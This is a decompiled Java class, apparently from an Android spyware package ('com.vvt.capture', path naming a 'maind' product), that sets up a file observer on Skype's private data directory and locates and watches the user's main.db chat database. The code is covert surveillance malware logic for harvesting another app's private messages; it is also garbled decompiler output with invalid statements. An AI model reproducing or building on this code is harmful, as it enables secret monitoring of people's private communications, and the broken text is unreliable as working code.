package com.vvt.capture.e.b.a;

import android.os.FileObserver;
import com.vvt.base.capture.h;
import java.io.File;
import java.util.HashSet;
import java.util.Iterator;

class f
  extends FileObserver
{
  public f(c paramc, String paramString)
  {
    super(paramString, 8);
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    ??? = null;
    int i = 8;
    boolean bool1;
    Object localObject2;
    Object localObject6;
    boolean bool2;
    Object localObject7;
    if (paramInt == i)
    {
      bool1 = c.e();
      if (bool1) {}
      localObject2 = com.vvt.capture.e.d.b();
      bool1 = c.e();
      if ((!bool1) || (localObject2 != null))
      {
        Object localObject3 = new java/lang/StringBuilder;
        ((StringBuilder)localObject3).<init>();
        localObject3 = ((StringBuilder)localObject3).append("/data/data/com.skype.raider/files");
        localObject6 = File.separator;
        localObject3 = ((StringBuilder)localObject3).append((String)localObject6).append((String)localObject2);
        localObject6 = File.separator;
        localObject6 = (String)localObject6 + "main.db";
        localObject3 = new java/io/File;
        ((File)localObject3).<init>((String)localObject6);
        bool1 = ((File)localObject3).exists();
        bool2 = c.c();
        if ((!bool2) || (bool1))
        {
          bool2 = c.c();
          if ((!bool2) || ((bool1) && (localObject2 != null)))
          {
            localObject3 = c.f();
            bool1 = ((String)localObject2).equals(localObject3);
            if (!bool1)
            {
              localObject3 = c.c(this.a);
              if (localObject3 != null)
              {
                c.c(this.a).stopWatching();
                localObject3 = this.a;
                c.a((c)localObject3, null);
              }
              localObject3 = this.a;
              synchronized (c.b((c)localObject3))
              {
                localObject3 = this.a;
                localObject3 = c.b((c)localObject3);
                localObject7 = ((HashSet)localObject3).iterator();
                bool1 = ((Iterator)localObject7).hasNext();
                if (!bool1) {
                  break label444;
                }
                localObject3 = ((Iterator)localObject7).next();
                localObject3 = (h)localObject3;
                ((h)localObject3).c();
              }
            }
          }
        }
        else
        {
          localObject5 = "live:";
          bool1 = ((String)localObject2).startsWith((String)localObject5);
          if (!bool1) {
            break label518;
          }
          localObject6 = "";
        }
      }
    }
    label444:
    label518:
    for (Object localObject5 = ((String)localObject2).replace("live:", (CharSequence)localObject6);; localObject5 = localObject2)
    {
      localObject6 = new java/lang/StringBuilder;
      ((StringBuilder)localObject6).<init>();
      localObject6 = ((StringBuilder)localObject6).append("/data/data/com.skype.raider/files");
      localObject7 = File.separator;
      localObject6 = ((StringBuilder)localObject6).append((String)localObject7);
      localObject7 = "live#3a";
      localObject5 = ((StringBuilder)localObject6).append((String)localObject7).append((String)localObject5);
      localObject6 = File.separator;
      localObject5 = (String)localObject6 + "main.db";
      localObject6 = new java/io/File;
      ((File)localObject6).<init>((String)localObject5);
      boolean bool3 = ((File)localObject6).exists();
      if (bool3) {}
      for (;;)
      {
        bool2 = c.c();
        if (bool2) {}
        localObject6 = localObject5;
        bool1 = bool3;
        break;
        c.b((String)localObject2);
        localObject5 = this.a;
        localObject2 = new com/vvt/capture/e/b/a/d;
        ??? = this.a;
        ((d)localObject2).<init>((c)???, (String)localObject6);
        c.a((c)localObject5, (d)localObject2);
        localObject5 = c.c(this.a);
        ((d)localObject5).startWatching();
        bool1 = c.e();
        if (bool1) {}
        return;
        bool1 = false;
        localObject5 = null;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */